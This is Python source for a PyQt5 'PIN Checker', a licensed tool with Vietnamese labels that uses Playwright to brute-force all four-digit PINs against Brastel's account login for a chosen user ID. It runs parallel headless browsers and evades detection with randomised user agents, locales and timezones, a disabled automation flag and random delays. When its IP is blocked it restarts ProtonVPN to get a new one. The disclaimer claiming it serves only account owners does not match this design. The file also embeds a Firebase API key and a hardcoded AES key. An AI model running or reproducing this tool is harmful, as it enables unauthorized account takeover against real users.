import sys
import os
import random
import asyncio
import subprocess
import time
import json
import hashlib
import uuid
import base64
import requests
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton, QVBoxLayout,
    QHBoxLayout, QTextEdit, QSpinBox, QInputDialog, QMessageBox, QDialog
)
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, Qt
from fake_useragent import UserAgent
from playwright.async_api import async_playwright, Response
import aiofiles
# === Fix Playwright khi đóng gói .exe ===
def get_browser_path():
    if getattr(sys, 'frozen', False):
        # khi chạy từ exe, PyInstaller unpack tạm thời ở _MEIPASS
        base = sys._MEIPASS
        return os.path.join(base, "playwright")
    else:
        return os.path.expanduser("~/.cache/ms-playwright")

# Set biến môi trường để Playwright tìm browser
os.environ["PLAYWRIGHT_BROWSERS_PATH"] = get_browser_path()

# ===== CONFIG =====
USER_ID = ""
NUM_TASKS = 5
STOP_ON_SUCCESS = True
PIN_LOG_FILE = ""
my_list_language = ["ind", "eng", "esp", "por", "tag", "vie", "rus", "tha", "chi", "jpn"]
my_list_lang_int = [1, 2, 3, 4, 5, 6, 8, 9, 15, 16]
DEFAULT_VPN_PATH = "/Applications/ProtonVPN.app"

# ===== LICENSE CONFIG =====
LICENSE_FILE = "license.json"
API_KEY = "AIzaSyB9eO9lWOZbrBWH9iqLjMan_x5fivN3sZk"
PROJECT_ID = "pin-checker-299b0-default-rtdb"
SECRET_KEY = b"1234567890abcdef"  # AES key 16 bytes

# ===== VPN CONTROL =====
vpn_restart_event = asyncio.Event()
vpn_restart_lock = asyncio.Lock()


def vpn_connect():
    vpn_path = current_gui.vpn_path_input.text().strip() if current_gui else DEFAULT_VPN_PATH
    if not os.path.exists(vpn_path):
        log(f"❌ VPN path không tồn tại: {vpn_path}")
        return
    subprocess.run(["open", "-a", vpn_path])

def vpn_disconnect():
    subprocess.run(["pkill", "-f", "ProtonVPN"], shell=False)


async def restart_vpn(task_id):
    async with vpn_restart_lock:
        if vpn_restart_event.is_set():
            log(f"[Task {task_id}] ⏳ VPN đang được xử lý bởi task khác.")
            return

        log(f"[Task {task_id}] 🔌 Task này đang khởi động lại VPN...")
        vpn_restart_event.set()

        try:
            vpn_disconnect()
        except Exception as e:
            log(f"[Task {task_id}] ⚠️ Lỗi khi ngắt VPN: {e}")

        vpn_connect()
        await asyncio.sleep(15)
        log(f"[Task {task_id}] ✅ VPN đã kết nối lại.")
        vpn_restart_event.clear()


# ===== LICENSE UTILS =====
def get_hwid():
    raw = str(uuid.getnode()) + os.getenv("COMPUTERNAME", "UNKNOWN")
    return hashlib.sha256(raw.encode()).hexdigest()


def encrypt_data(data: str) -> str:
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv=SECRET_KEY)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(ct_bytes).decode()


def decrypt_data(data: str) -> str:
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv=SECRET_KEY)
    ct = base64.b64decode(data)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()


def load_license():
    if not os.path.exists(LICENSE_FILE):
        return None
    try:
        with open(LICENSE_FILE, "r") as f:
            enc = f.read()
            dec = decrypt_data(enc)
            return json.loads(dec)
    except:
        return None


def save_license(data):
    with open(LICENSE_FILE, "w") as f:
        f.write(encrypt_data(json.dumps(data)))

# ===== dialog =====
class LicenseDialog(QDialog):
    def __init__(self, hwid):
        super().__init__()
        self.setWindowTitle("🔐 Nhập License Key")
        self.setFixedSize(400, 220)

        self.result = None
        layout = QVBoxLayout()

        # HWID label
        layout.addWidget(QLabel("🆔 HWID của bạn (copy gửi admin):"))

        # HWID field có thể copy được
        self.hwid_field = QLineEdit()
        self.hwid_field.setText(hwid)
        self.hwid_field.setReadOnly(True)
        self.hwid_field.setStyleSheet("QLineEdit { background-color: #f0f0f0; }")
        layout.addWidget(self.hwid_field)

        # Nhập License Key
        layout.addWidget(QLabel("🔑 Nhập License Key:"))
        self.license_input = QLineEdit()
        self.license_input.setPlaceholderText("Nhập license key...")
        layout.addWidget(self.license_input)

        # Buttons
        btn_layout = QHBoxLayout()
        self.ok_btn = QPushButton("✅ OK")
        self.ok_btn.clicked.connect(self.accept_license)
        self.cancel_btn = QPushButton("❌ Thoát")
        self.cancel_btn.clicked.connect(self.reject)
        btn_layout.addWidget(self.ok_btn)
        btn_layout.addWidget(self.cancel_btn)

        layout.addLayout(btn_layout)
        self.setLayout(layout)

    def accept_license(self):
        key = self.license_input.text().strip()
        if key:
            self.result = key
            self.accept()
        else:
            QMessageBox.warning(self, "Lỗi", "Vui lòng nhập License Key.")

# ===== FIREBASE AUTH =====
def get_id_token():
    try:
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}"
        r = requests.post(url, json={"returnSecureToken": True}, timeout=10)
        r.raise_for_status()
        return r.json()["idToken"]
    except Exception as e:
        log(f"⚠️ Auth error: {e}")
        return None


# ===== LICENSE MANAGER (THEO YÊU CẦU) =====
# ===== LICENSE MANAGER (CÓ CACHE 16 GIỜ) =====
license_cache = {
    "ok": None,
    "msg": None,
    "expire_time": 0
}

def check_license_flow(gui=None, force=False):
    global license_cache

    now = int(time.time())
    # Nếu còn cache và chưa hết hạn -> dùng lại
    if not force and license_cache["ok"] is not None and now < license_cache["expire_time"]:
        return license_cache["ok"], license_cache["msg"]

    hwid = get_hwid()
    lic = load_license()

    if not lic or "key" not in lic:
        dialog = LicenseDialog(hwid)
        if dialog.exec_() == QDialog.Accepted and dialog.result:
            key = dialog.result
            save_license({"key": key, "hwid": hwid})   # <-- chỗ này trước bạn comment mất
            lic = load_license()
        else:
            license_cache = {"ok": False, "msg": "Người dùng đã hủy nhập key", "expire_time": now + 60}
            return False, "Người dùng đã hủy nhập key"

    id_token = get_id_token()
    if not id_token:
        license_cache = {"ok": False, "msg": "Không lấy được idToken", "expire_time": now + 28800}
        return False, "Không lấy được idToken"

    try:
        url = f"https://{PROJECT_ID}.firebaseio.com/license/{lic['key']}.json?auth={id_token}"
        r = requests.get(url, timeout=10)
        if r.status_code != 200:
            license_cache = {"ok": False, "msg": "Không kết nối được", "expire_time": now + 28800}
            return False, "Không kết nối được"

        data = r.json()
        if not data:
            license_cache = {"ok": False, "msg": "❌ Key không tồn tại trên hệ thống", "expire_time": now + 28800}
            return False, "❌ Key không tồn tại trên hệ thống"

        if data.get("status") == -1:
            license_cache = {"ok": False, "msg": "❌ License đã bị block", "expire_time": now + 28800}
            return False, "❌ License đã bị block"
        if data.get("hwid") != hwid:
            license_cache = {"ok": False, "msg": "❌ License không đúng máy", "expire_time": now + 28800}
            return False, "❌ License không đúng máy"

        if data.get("isActive"):
            msg = "✅ License hợp lệ (đã active)"
            ok = True
        else:
            expire_at = int(data.get("expireAt", 0))
            if now > expire_at:
                msg = "❌ License hết hạn"
                ok = False
            else:
                msg = "⚠️ License còn hạn (chưa active)"
                ok = True

        # Lưu cache 8h
        license_cache = {"ok": ok, "msg": msg, "expire_time": now + 57600}
        return ok, msg

    except Exception as e:
        license_cache = {"ok": False, "msg": f"Lỗi kết nối server: {e}", "expire_time": now + 60}
        return False, f"Lỗi kết nối server: {e}"


# ===== HELPERS =====
def generate_pin_range(start, end):
    return [f"{i:04}" for i in range(start, end + 1)]


def split_range(total_start, total_end, num_parts):
    step = (total_end - total_start + 1) // num_parts
    ranges = []
    for i in range(num_parts):
        s = total_start + i * step
        e = total_start + (i + 1) * step - 1 if i < num_parts - 1 else total_end
        ranges.append((s, e))
    return ranges


def get_user_agent(ua_gen):
    return ua_gen.random


def get_random_viewport():
    return {
        "width": random.randint(1200, 1920),
        "height": random.randint(720, 1080)
    }


def get_random_timezone():
    zones = ["America/New_York", "Europe/Berlin", "Asia/Tokyo", "Asia/Ho_Chi_Minh"]
    return random.choice(zones)


def get_random_locale():
    locales = ["en-US", "en-GB", "ja-JP", "vi-VN", "de-DE"]
    return random.choice(locales)


# ===== FILE HANDLING =====
file_lock = asyncio.Lock()


async def is_pin_tried(pin: str) -> bool:
    if not os.path.exists(PIN_LOG_FILE):
        return False
    async with file_lock:
        async with aiofiles.open(PIN_LOG_FILE, "r", encoding="utf-8") as f:
            async for line in f:
                if line.strip() == pin:
                    return True
    return False


async def mark_pin_tried(pin: str):
    async with file_lock:
        async with aiofiles.open(PIN_LOG_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{pin}\n")


# ===== CORE TASK =====
LOGIN_URL_1 = "https://www.brastel.com/{0}/myaccount"
LOGIN_URL_2 = "https://www.brastel.com/WEB/WIMS/Manager.aspx?xslFile=cyber_login.xsl&acr={0}"


async def run_task(task_id, pin_range, ua_gen):
    await asyncio.sleep(task_id)
    log(f"[Task {task_id}] ▶️ Bắt đầu task cho range {pin_range[0]} → {pin_range[-1]}")
    pin_index = 0

    while pin_index < len(pin_range):
        while vpn_restart_event.is_set():
            await asyncio.sleep(3)

        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--disable-blink-features=AutomationControlled"]
            )

            user_agent = get_user_agent(ua_gen)
            viewport = get_random_viewport()
            tz = get_random_timezone()
            locale = get_random_locale()

            context = await browser.new_context(
                user_agent=user_agent,
                viewport=viewport,
                locale=locale,
                timezone_id=tz
            )

            page = await context.new_page()

            try:
                await page.goto(LOGIN_URL_1.format(random.choice(my_list_language)), timeout=60000)
                await page.wait_for_load_state('networkidle')
            except Exception as e:
                log(f"[Task {task_id}] ❌ Không thể tải trang login: {e}")
                await browser.close()
                await restart_vpn(task_id)
                continue

            retries = 0
            while pin_index < len(pin_range):
                if vpn_restart_event.is_set():
                    log(f"[Task {task_id}] ⏸️ Bị gián đoạn do VPN restart.")
                    break

                pin = pin_range[pin_index]
                if await is_pin_tried(pin):
                    pin_index += 1
                    continue

                login_result = {"status": None}

                async def process_login_response(response: Response):
                    try:
                        text = await response.text()
                        if "Invalid User ID or PIN" in text or "PIN" in text:
                            login_result["status"] = "invalid"
                        elif "Exception" in text or "captcha" in text.lower():
                            login_result["status"] = "error"
                        else:
                            login_result["status"] = "valid"
                    except:
                        login_result["status"] = "error"

                def make_handler(pin_value):
                    async def _inner(response: Response):
                        if "WIMS.LoginAjax,WIMS.ashx" in response.url:
                            await process_login_response(response)
                    return _inner

                page.on("response", make_handler(pin))

                try:
                    await page.fill('input#accCodeInput', USER_ID)
                    await page.fill('input#pinInput', pin)
                    await asyncio.sleep(random.uniform(0, 4.0))
                    await page.click("button.gradient")

                    for _ in range(200):
                        if login_result["status"] is not None:
                            break
                        await asyncio.sleep(0.1)

                    if login_result["status"] == "valid":
                        log(f"\n🎉 [Task {task_id}] ✅ SUCCESS với PIN: {pin}")
                        await browser.close()
                        return pin

                    elif login_result["status"] == "invalid":
                        log(f"[Task {task_id}] ❌ Sai PIN: {pin}")
                        await mark_pin_tried(pin)
                        await asyncio.sleep(random.uniform(0, 5.0))
                        pin_index += 1
                        continue

                    elif login_result["status"] == "error":
                        log(f"[Task {task_id}] ⚠️ Lỗi thử PIN: {pin}, thử lại lần {retries + 1}...")
                        await asyncio.sleep(random.uniform(0, 5.0))
                        retries += 1

                        if retries >= 2:
                            try:
                                log(f"[Task {task_id}] 🔁 Đang reload trang login...")
                                await page.select_option('#langSel', f'{random.choice(my_list_lang_int)}')
                                await page.wait_for_load_state('networkidle')
                                log(f"[Task {task_id}] ✅ Reload thành công.")
                            except Exception as e:
                                log(f"[Task {task_id}] ❌ Lỗi khi reload trang: {e}")
                                retries = 10
                        if retries >= 6:
                            await page.goto(LOGIN_URL_2.format(random.choice(my_list_lang_int)), timeout=60000)
                            await page.wait_for_load_state('networkidle')
                        if retries >= 10:
                            log(f"[Task {task_id}] 🚫 Có thể bị chặn IP sau 10 lần lỗi. Cần restart VPN!")
                            await browser.close()
                            await restart_vpn(task_id)
                            retries = 0
                            break
                        continue

                except Exception as e:
                    log(f"[Task {task_id}] ❌ Exception thử PIN {pin}: {e}")
                    await asyncio.sleep(1)

            await browser.close()

    log(f"[Task {task_id}] 📌 Hết PIN trong phạm vi.")
    return None


# ===== MAIN LOGIC TO CALL FROM GUI =====
async def main_logic(user_id, pin_start, pin_end):
    global USER_ID, PIN_LOG_FILE
    USER_ID = user_id
    PIN_LOG_FILE = f"{USER_ID}.txt"

    ua_gen = UserAgent()
    pin_ranges = split_range(pin_start, pin_end, NUM_TASKS)
    tasks = []

    log("🛜 Đang khởi động VPN...")
    vpn_connect()
    await asyncio.sleep(15)

    for i, (start, end) in enumerate(pin_ranges):
        pins = generate_pin_range(start, end)
        task = asyncio.create_task(run_task(i + 1, pins, ua_gen))
        tasks.append(task)

    done, pending = await asyncio.wait(
        tasks,
        return_when=asyncio.FIRST_COMPLETED if STOP_ON_SUCCESS else asyncio.ALL_COMPLETED
    )

    for task in pending:
        task.cancel()

    for t in done:
        if t.result():
            vpn_disconnect()
            return f"\n✅ TÌM THẤY PIN HỢP LỆ: {t.result()}"

    vpn_disconnect()
    return "\n❌ Không tìm thấy PIN hợp lệ nào."


# ===== GUI LOGGING =====
current_gui = None


def log(message):
    print(message)
    if current_gui and hasattr(current_gui, 'log_signal'):
        current_gui.log_signal.emit(message)


# ===== GUI =====
class WorkerThread(QThread):
    result_signal = pyqtSignal(str)

    def __init__(self, user_id, pin_start, pin_end):
        super().__init__()
        self.user_id = user_id
        self.pin_start = pin_start
        self.pin_end = pin_end

    def run(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(main_logic(self.user_id, self.pin_start, self.pin_end))
        except Exception as e:
            result = f"❌ Lỗi xảy ra khi chạy task: {e}"
        self.result_signal.emit(result)


class MainWindow(QWidget):
    log_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        global current_gui
        current_gui = self

        self.setWindowTitle("🔐PIN Checker (License Protected)")
        self.setFixedSize(800, 600)

        layout = QVBoxLayout()
        self.vpn_path_input = QLineEdit()
        self.vpn_path_input.setText("C:\\Program Files\\Proton\\VPN\\v4.2.2\\ProtonVPN.Client.exe")
        layout.addWidget(QLabel("Đường dẫn đến ProtonVPN.exe:"))
        layout.addWidget(self.vpn_path_input)

        self.user_id_input = QLineEdit()
        self.user_id_input.setPlaceholderText("Nhập User ID")
        layout.addWidget(QLabel("User ID:"))
        layout.addWidget(self.user_id_input)

        pin_layout = QHBoxLayout()
        self.pin_start = QSpinBox()
        self.pin_start.setRange(0, 9999)
        self.pin_start.setValue(0)

        self.pin_end = QSpinBox()
        self.pin_end.setRange(0, 9999)
        self.pin_end.setValue(9999)

        pin_layout.addWidget(QLabel("Từ PIN:"))
        pin_layout.addWidget(self.pin_start)
        pin_layout.addWidget(QLabel("Đến PIN:"))
        pin_layout.addWidget(self.pin_end)
        layout.addLayout(pin_layout)

        self.start_btn = QPushButton("🚀 Bắt đầu dò PIN")
        self.start_btn.clicked.connect(self.start_checking)
        layout.addWidget(self.start_btn)

        self.timer_label = QLabel("⏱️ Thời gian chạy: 00:00:00")
        self.timer_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.timer_label)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_timer)
        self.start_time = None

        self.log_signal.connect(self.append_log)

        # ===== Check License khi mở tool =====
        ok, msg = check_license_flow()
        if not ok:
            self.output.append(f"❌ {msg}")
            sys.exit(0)
        else:
            self.output.append(f"✅ {msg}")

    def append_log(self, message):
        self.output.append(message)

    def update_timer(self):
        if self.start_time:
            elapsed = int(time.time() - self.start_time)
            hrs = elapsed // 3600
            mins = (elapsed % 3600) // 60
            secs = elapsed % 60
            self.timer_label.setText(f"⏱️ Thời gian chạy: {hrs:02}:{mins:02}:{secs:02}")

    def start_checking(self):
        # check license trước khi chạy
        ok, msg = check_license_flow()
        if not ok:
            self.output.append(f"⚠️ {msg}")
            return

        user_id = self.user_id_input.text().strip()
        pin_start = self.pin_start.value()
        pin_end = self.pin_end.value()

        if not user_id:
            self.output.append("⚠️ Vui lòng nhập User ID.")
            return

        self.output.append("🔄 Đang khởi động dò PIN...")
        self.start_btn.setEnabled(False)
        self.start_time = time.time()
        self.timer.start(1000)

        self.worker = WorkerThread(user_id, pin_start, pin_end)
        self.worker.result_signal.connect(self.finish_checking)
        self.worker.start()

    def finish_checking(self, result):
        self.output.append(result)
        self.start_btn.setEnabled(True)
        self.timer.stop()


if __name__ == "__main__":
    app = QApplication(sys.argv)

    disclaimer = QMessageBox()
    disclaimer.setWindowTitle("⚠️ Thông báo quan trọng")
    disclaimer.setIcon(QMessageBox.Warning)
    disclaimer.setText(
        "🚨 Công cụ này CHỈ dành cho mục đích hợp pháp:\n\n"
        "✔️ Hỗ trợ người dùng chính chủ đăng nhập lại tài khoản khi quên mật khẩu/PIN.\n"
        "❌ Tuyệt đối KHÔNG sử dụng để tấn công, dò tìm trái phép hay gây thiệt hại cho hệ thống, dịch vụ hoặc người khác.\n\n"
        "➡️ Tiếp tục sử dụng đồng nghĩa bạn đồng ý chịu hoàn toàn trách nhiệm."
    )
    disclaimer.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
    disclaimer.setDefaultButton(QMessageBox.Ok)

    if disclaimer.exec_() == QMessageBox.Cancel:
        sys.exit(0)

    ok, msg = check_license_flow()
    if not ok:
        QMessageBox.critical(None, "🚫 Lỗi License", msg)
        sys.exit(1)

    win = MainWindow()
    win.show()
    sys.exit(app.exec_())
